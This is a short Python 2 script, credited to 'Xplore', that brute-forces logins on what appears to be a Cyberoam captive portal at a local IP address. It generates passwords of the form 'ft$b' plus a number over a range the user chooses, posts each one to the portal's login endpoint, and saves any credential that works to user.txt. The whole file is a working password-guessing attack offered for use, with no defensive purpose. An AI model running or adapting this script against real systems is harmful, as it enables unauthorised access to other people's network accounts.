__author__ = 'Xplore'
# Cyberaom brute force Script


import urllib
import time
import datetime
import urllib2
import sys
import xml.dom.minidom as XML

#CountDown And Credits
def countdown(num):
    for i in xrange(num,0,-1):
        time.sleep(1)
        sys.stdout.write(str(i%10)+'\r')
        sys.stdout.flush()
        
print 'MADE BY - "XPLORE" '
countdown(5)
userid = raw_input("enter user id:")
test=[]
range_st=int(raw_input("Enter the starting number:"))
range_ed=int(raw_input("Enter the last number:"))

for i in range(range_st,range_ed+1):
              test.append('ft$b'+str(i))
print len(test)
def sendLoginRequest(username, password):
    url = 'http://192.168.100.1:8090/httpclient.html'
    post_data = 'mode=191' + '&username=' + username + '&password=' + password
    try:
        req = urllib2.Request(url, post_data)
        response = urllib2.urlopen(req)
        xml_dom = XML.parseString(response.read())
        document = xml_dom.documentElement
        response = document.getElementsByTagName('message')[0].childNodes[0].nodeValue
        print response
        if 'successfully' in response:
            return True
        elif 'Limit' in response:
            return True
        elif 'Maximum' in response:
            return True
        elif 'data' in response:
            return True
            
    except:
        return False
    
for l in test:
    print l
    if sendLoginRequest(userid, l) == True:        
        print 'success!!! and '+l+' - password, userid -'+userid
        with open("user.txt","a") as myfile:
            myfile.write(userid+" "+str(l)+'\n')
            break
        break

lgt = raw_input("do you want to log out -type yes  :")
def sendLogoutRequest(username):
    url = 'http://192.168.100.1:8090/httpclient.html'
    post_data = 'mode=193' + '&username=' + username
    req = urllib2.Request(url, post_data)
    response = urllib2.urlopen(req)
    print response
    print 'logout.'

if lgt == 'yes':
    sendLogoutRequest(userid)




